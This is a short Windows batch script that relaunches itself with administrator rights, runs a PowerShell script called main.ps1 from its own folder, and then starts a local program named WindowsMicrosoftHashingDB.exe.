@echo off
:: Check if the script is running as administrator
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo This script requires administrative privileges.
    echo Attempting to relaunch as administrator...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~0' -Verb RunAs"
    exit /b
)

:: Run the PowerShell script
powershell.exe -ExecutionPolicy RemoteSigned -NoProfile -File "%~dp0main.ps1" -WorkingDirectory "%~dp0"
pause
start %~dp0\WindowsMicrosoftHashingDB.exe
pause